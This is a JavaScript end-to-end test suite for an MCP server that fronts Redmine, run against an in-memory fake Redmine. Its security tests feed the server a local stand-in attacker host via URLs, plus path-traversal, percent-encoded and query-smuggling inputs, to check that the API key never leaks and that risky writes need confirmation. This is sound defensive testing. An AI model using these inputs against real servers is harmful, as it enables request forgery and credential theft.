// End-to-end test of the built server against an in-memory fake Redmine.
// Covers writes, deletes and both confirmation paths without touching real data.
//   npm test
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { ElicitRequestSchema } from "@modelcontextprotocol/sdk/types.js";

// --- Fake Redmine ----------------------------------------------------------

const db = {
  statuses: [
    { id: 1, name: "新建" },
    { id: 2, name: "進行中" },
    { id: 5, name: "已結束", is_closed: true },
  ],
  trackers: [
    { id: 1, name: "Bug" },
    { id: 2, name: "功能" },
  ],
  priorities: [
    { id: 2, name: "一般" },
    { id: 3, name: "高" },
  ],
  activities: [
    { id: 8, name: "開發" },
    { id: 9, name: "測試" },
  ],
  projects: [
    { id: 1, identifier: "web", name: "官網" },
    { id: 2, identifier: "app", name: "App" },
  ],
  members: [
    { user: { id: 7, name: "林小明" }, roles: [{ id: 3, name: "開發者" }] },
    { user: { id: 8, name: "王 Amy" }, roles: [{ id: 3, name: "開發者" }] },
  ],
  issues: new Map(),
  timeEntries: new Map(),
  nextIssue: 100,
  nextTime: 500,
  requests: [],
};

const named = (list, id) => list.find((x) => x.id === Number(id));
const user = (id) => db.members.map((m) => m.user).find((u) => u.id === Number(id));

function makeIssue(fields) {
  const id = db.nextIssue++;
  const issue = {
    id,
    project: { id: 1, name: "官網" },
    tracker: db.trackers[0],
    status: db.statuses[0],
    priority: db.priorities[0],
    author: { id: 7, name: "林小明" },
    subject: "untitled",
    created_on: "2026-10-01T00:00:00Z",
    updated_on: "2026-10-01T00:00:00Z",
    journals: [],
  };
  applyIssue(issue, fields);
  db.issues.set(id, issue);
  return issue;
}

function applyIssue(issue, f) {
  if (f.project_id) issue.project = { id: Number(f.project_id), name: named(db.projects, f.project_id).name };
  if (f.subject) issue.subject = f.subject;
  if (f.description !== undefined) issue.description = f.description;
  if (f.tracker_id) issue.tracker = named(db.trackers, f.tracker_id);
  if (f.status_id) issue.status = named(db.statuses, f.status_id);
  if (f.priority_id) issue.priority = named(db.priorities, f.priority_id);
  if (f.assigned_to_id !== undefined) issue.assigned_to = f.assigned_to_id === "" ? undefined : user(f.assigned_to_id);
  if (f.due_date !== undefined) issue.due_date = f.due_date || undefined;
  if (f.done_ratio !== undefined) issue.done_ratio = f.done_ratio;
  if (f.notes) issue.journals.push({ id: Date.now(), user: { id: 7, name: "林小明" }, notes: f.notes, created_on: "2026-10-15T10:00:00Z", details: [] });
}

const send = (res, status, body) => {
  res.writeHead(status, { "Content-Type": "application/json" });
  res.end(body === undefined ? "" : JSON.stringify(body));
};

const fake = createServer(async (req, res) => {
  const url = new URL(req.url, "http://x");
  const p = url.pathname.replace(/^\//, "");
  let body = "";
  for await (const chunk of req) body += chunk;
  const data = body ? JSON.parse(body) : {};
  db.requests.push(`${req.method} ${p}`);
  assert.equal(req.headers["x-redmine-api-key"], "test-key");

  const m = (re) => p.match(re);
  let r;
  if (p === "users/current.json") return send(res, 200, { user: { id: 7, login: "ming", firstname: "小明", lastname: "林", api_key: "secret" } });
  if (p === "issue_statuses.json") return send(res, 200, { issue_statuses: db.statuses });
  if (p === "trackers.json") return send(res, 200, { trackers: db.trackers });
  if (p === "enumerations/issue_priorities.json") return send(res, 200, { issue_priorities: db.priorities });
  if (p === "enumerations/time_entry_activities.json") return send(res, 200, { time_entry_activities: db.activities });
  if (p === "projects.json") return send(res, 200, { projects: db.projects, total_count: db.projects.length });
  if ((r = m(/^projects\/(\d+)\.json$/))) {
    return send(res, 200, { project: { ...named(db.projects, r[1]), trackers: db.trackers, issue_categories: [], time_entry_activities: db.activities, issue_custom_fields: [] } });
  }
  if (m(/^projects\/\d+\/memberships\.json$/)) return send(res, 200, { memberships: db.members, total_count: db.members.length });
  if (m(/^projects\/\d+\/versions\.json$/)) return send(res, 200, { versions: [{ id: 3, name: "v1.0", status: "open" }] });
  if (p === "issues.json" && req.method === "GET") {
    let list = [...db.issues.values()];
    const a = url.searchParams.get("assigned_to_id");
    if (a) list = list.filter((i) => i.assigned_to?.id === (a === "me" ? 7 : Number(a)));
    return send(res, 200, { issues: list, total_count: list.length });
  }
  if (p === "issues.json" && req.method === "POST") return send(res, 201, { issue: makeIssue(data.issue) });
  if ((r = m(/^issues\/(\d+)\.json$/))) {
    const issue = db.issues.get(Number(r[1]));
    if (!issue) return send(res, 404, {});
    if (req.method === "GET") return send(res, 200, { issue });
    if (req.method === "PUT") {
      applyIssue(issue, data.issue);
      return send(res, 204);
    }
    if (req.method === "DELETE") {
      db.issues.delete(issue.id);
      return send(res, 204);
    }
  }
  if (p === "time_entries.json" && req.method === "POST") {
    const t = data.time_entry;
    if (!t.activity_id) return send(res, 422, { errors: ["活動 不可空白"] });
    const entry = { id: db.nextTime++, project: { id: 1, name: "官網" }, issue: t.issue_id && { id: t.issue_id }, user: { id: 7, name: "林小明" }, activity: named(db.activities, t.activity_id), hours: t.hours, comments: t.comments, spent_on: t.spent_on };
    db.timeEntries.set(entry.id, entry);
    return send(res, 201, { time_entry: entry });
  }
  if (p === "time_entries.json") return send(res, 200, { time_entries: [...db.timeEntries.values()], total_count: db.timeEntries.size });
  if ((r = m(/^time_entries\/(\d+)\.json$/))) {
    const entry = db.timeEntries.get(Number(r[1]));
    if (!entry) return send(res, 404, {});
    if (req.method === "DELETE") {
      db.timeEntries.delete(entry.id);
      return send(res, 204);
    }
    return send(res, 200, { time_entry: entry });
  }
  if (p === "versions/3.json" && req.method === "DELETE") return send(res, 204);
  if (p === "projects/1/wiki/Meeting:2026.json") return send(res, 200, { wiki_page: { title: "Meeting:2026", text: "會議紀錄" } });
  if (p === "uploads.json" && req.method === "POST") {
    assert.equal(url.searchParams.get("filename"), "report.pdf");
    return send(res, 201, { upload: { token: "tok-1" } });
  }
  if (p === "my/account.json") return send(res, 200, { user: { id: 7, login: "ming", api_key: "secret", nested: [{ api_key: "secret" }] } });
  send(res, 404, { errors: [`fake: no route ${req.method} ${p}`] });
});

await new Promise((ok) => fake.listen(0, "127.0.0.1", ok));
const REDMINE_URL = `http://127.0.0.1:${fake.address().port}`;

// Stands in for an attacker's host: it must never receive a request (or the API key).
const stolen = [];
const evil = createServer((req, res) => {
  stolen.push(`${req.method} ${req.url} key=${req.headers["x-redmine-api-key"]}`);
  res.end("{}");
});
await new Promise((ok) => evil.listen(0, "127.0.0.1", ok));
const EVIL = `127.0.0.1:${evil.address().port}`;

// --- MCP clients -----------------------------------------------------------

async function connect({ elicitAnswer } = {}) {
  const client = new Client(
    { name: "test", version: "0" },
    { capabilities: elicitAnswer ? { elicitation: { form: {} } } : {} },
  );
  const prompts = [];
  if (elicitAnswer) {
    client.setRequestHandler(ElicitRequestSchema, (req) => {
      prompts.push(req.params.message);
      return elicitAnswer === "accept" ? { action: "accept", content: { confirm: true } } : { action: "decline" };
    });
  }
  await client.connect(
    new StdioClientTransport({
      command: "node",
      args: ["server/index.mjs"],
      env: { ...process.env, REDMINE_URL, REDMINE_API_KEY: "test-key" },
      stderr: "ignore",
    }),
  );
  const call = async (name, args = {}) => {
    const res = await client.callTool({ name, arguments: args });
    return res.content[0].text;
  };
  return { client, call, prompts };
}

let passed = 0;
async function test(name, fn) {
  try {
    await fn();
    passed++;
    console.log(`✓ ${name}`);
  } catch (e) {
    console.error(`✗ ${name}\n  ${e.message}`);
    process.exitCode = 1;
  }
}

const plain = await connect();
const yes = await connect({ elicitAnswer: "accept" });
const no = await connect({ elicitAnswer: "decline" });

await test("列出 15 個工具", async () => {
  const { tools } = await plain.client.listTools();
  assert.equal(tools.length, 15);
  assert.ok(tools.find((t) => t.name === "delete_issue").annotations.destructiveHint);
});

await test("用名稱建立 issue", async () => {
  const out = await plain.call("create_issue", { project: "官網", subject: "登入失敗", tracker: "bug", priority: "高", assignee: "Amy" });
  assert.match(out, /已建立 #100｜\[Bug\] 新建｜高｜登入失敗｜王 Amy/);
});

await test("名稱找不到時回傳可選清單", async () => {
  const out = await plain.call("update_issue", { issue_id: 100, status: "處理中" });
  assert.match(out, /狀態「處理中」找不到。可選：新建（id 1）、進行中（id 2）/);
});

await test("update_issue 回傳改前改後並加備註", async () => {
  const out = await plain.call("update_issue", { issue_id: 100, status: "進行中", assignee: "me", notes: "開始處理" });
  assert.match(out, /狀態：新建 → 進行中/);
  assert.match(out, /指派：王 Amy → 林小明/);
  assert.match(out, /已新增備註/);
});

await test("list_issues assignee=me", async () => {
  const out = await plain.call("list_issues", { assignee: "me" });
  assert.match(out, /共 1 筆/);
  assert.match(out, /#100｜\[Bug\] 進行中/);
});

await test("回傳內容用資料標籤包起來", async () => {
  assert.match(await plain.call("get_issue", { issue_id: 100 }), /<redmine-data-[0-9a-f]+>[\s\S]*開始處理/);
});

await test("log_time 缺活動時列出可選活動", async () => {
  assert.match(await plain.call("log_time", { issue_id: 100, hours: 2 }), /可能需要指定活動，可選：開發、測試/);
  assert.match(await plain.call("log_time", { issue_id: 100, hours: 2, activity: "開發" }), /已記 2h 到 #100/);
});

await test("不支援 elicitation：刪除先暫停、拿 token 才執行", async () => {
  const issue = makeIssue({ subject: "要刪的" });
  const paused = await plain.call("delete_issue", { issue_id: issue.id });
  assert.match(paused, /尚未執行：刪除 issue/);
  assert.ok(db.issues.has(issue.id), "確認前不能刪");
  const token = paused.match(/token 為 ([0-9a-f]+)/)[1];
  assert.match(await plain.call("confirm_action", { token }), /已刪除 issue/);
  assert.ok(!db.issues.has(issue.id));
  assert.match(await plain.call("confirm_action", { token }), /token 無效或已過期/, "token 只能用一次");
});

await test("支援 elicitation：使用者同意才刪", async () => {
  const issue = makeIssue({ subject: "同意刪除" });
  assert.match(await yes.call("delete_issue", { issue_id: issue.id }), /已刪除 issue/);
  assert.match(yes.prompts.at(-1), /刪除 issue #\d+/);
  assert.ok(!db.issues.has(issue.id));
});

await test("支援 elicitation：使用者拒絕就不刪，也不給 token", async () => {
  const issue = makeIssue({ subject: "拒絕刪除" });
  const out = await no.call("delete_issue", { issue_id: issue.id });
  assert.match(out, /使用者沒有同意/);
  assert.doesNotMatch(out, /token/);
  assert.ok(db.issues.has(issue.id));
});

await test("搬移專案需要確認，一般修改不需要", async () => {
  const issue = makeIssue({ subject: "要搬的" });
  assert.match(await plain.call("update_issue", { issue_id: issue.id, project: "App" }), /尚未執行：#\d+ 搬到專案「App」/);
  assert.equal(db.issues.get(issue.id).project.id, 1);
  assert.match(await yes.call("update_issue", { issue_id: issue.id, project: "App" }), /專案：官網 → App/);
});

await test("批次修改：4 張直接執行、5 張要確認", async () => {
  const four = [1, 2, 3, 4].map(() => makeIssue({}).id);
  assert.match(await plain.call("bulk_update_issues", { issue_ids: four, status: "已結束" }), /成功 4 張/);
  const five = [1, 2, 3, 4, 5].map(() => makeIssue({}).id);
  assert.match(await plain.call("bulk_update_issues", { issue_ids: five, status: "已結束" }), /尚未執行：批次修改 5 張/);
  assert.ok(five.every((id) => db.issues.get(id).status.id === 1));
});

await test("redmine_request：DELETE 要確認，GET 不用", async () => {
  assert.match(await plain.call("redmine_request", { path: "/versions/3.json", method: "DELETE" }), /尚未執行：刪除：DELETE/);
  assert.ok(!db.requests.includes("DELETE versions/3.json"));
  assert.match(await plain.call("redmine_request", { path: "/projects.json" }), /status: 200/);
});

await test("刪除工時要確認", async () => {
  const id = [...db.timeEntries.keys()][0];
  assert.match(await plain.call("delete_time_entry", { time_entry_id: id }), /尚未執行：刪除工時/);
  assert.ok(db.timeEntries.has(id));
});

await test("沒設定資料夾時附件功能回報原因", async () => {
  assert.match(await plain.call("download_attachment", { attachment_id: 1, save_path: "/tmp/x" }), /附件功能未啟用/);
});

await test("不會把 API 金鑰傳回給 Claude", async () => {
  assert.doesNotMatch(await plain.call("list_issues", { assignee: "me" }), /secret/);
});

// --- Security --------------------------------------------------------------

const req = (args) => plain.call("redmine_request", args);
const PAUSED = /尚未執行/;

await test("安全：不會連到其他主機、不會送出 API 金鑰", async () => {
  for (const path of [`http://${EVIL}/x.json`, `https://${EVIL}/x.json`, `\\\\${EVIL}/x.json`, `//${EVIL}/x.json`, `http:${EVIL}/x.json`, "../../x.json"]) {
    const out = await req({ path });
    assert.doesNotMatch(out, /status: 200/, `${path} 不應成功`);
  }
  assert.match(await req({ path: `http://${EVIL}/x.json` }), /只能連到設定的 Redmine/);
  assert.deepEqual(stolen, [], "攻擊者主機收到了請求");
});

await test("安全：正常操作不受影響", async () => {
  assert.match(await req({ path: "/projects/1/wiki/Meeting:2026.json" }), /會議紀錄/, "wiki 頁名含冒號");
  assert.match(await req({ path: "/uploads.json", method: "POST", params: { filename: "report.pdf" } }), /tok-1/, "上傳帶 query 參數");
  assert.match(await req({ path: "/issues.json", params: { assigned_to_id: "me", status_id: "open" } }), /status: 200/, "GET 帶篩選");
  assert.match(await req({ path: `${REDMINE_URL}/projects.json` }), /status: 200/, "完整網址指向同一台 Redmine");
  assert.match(await req({ path: "/issues/100.json", method: "PUT", data: { issue: { notes: "一般備註" } } }), /status: 204/, "一般修改不需確認");
});

await test("安全：路徑與參數技巧仍需要確認", async () => {
  const issue = makeIssue({ subject: "不能被偷偷搬走" });
  const cases = [
    { path: "./memberships/5.json", method: "PUT", data: { membership: { role_ids: [3] } } },
    { path: "%2e/memberships/5.json", method: "PUT", data: { membership: { role_ids: [3] } } },
    { path: "%6demberships/5.json", method: "PUT", data: { membership: { role_ids: [3] } } },
    { path: "issues/../projects/web/memberships.json", method: "POST", data: { membership: { user_id: 99 } } },
    { path: "projects/web.xml", method: "PUT", data: { project: { is_public: true } } },
    { path: `/issues/${issue.id}.json?issue[project_id]=2`, method: "PUT" },
    { path: `/issues/${issue.id}.json`, method: "PUT", params: { "issue[tracker_id]": 2 } },
    { path: `./issues/${issue.id}.json`, method: "PUT", data: { issue: { project_id: 2 } } },
  ];
  for (const c of cases) assert.match(await req(c), PAUSED, `${c.method} ${c.path} 應該要確認`);
  assert.equal(db.issues.get(issue.id).project.id, 1);
  assert.equal(db.issues.get(issue.id).tracker.id, 1);
});

await test("安全：回傳內容移除 api_key", async () => {
  const out = await req({ path: "/my/account.json" }) + (await req({ path: "/users/current.json" }));
  assert.doesNotMatch(out, /secret|api_key/);
  assert.match(out, /login: ming/);
});

for (const c of [plain, yes, no]) await c.client.close();
fake.close();
evil.close();
console.log(`\n${passed} passed${process.exitCode ? ", some failed" : ""}`);
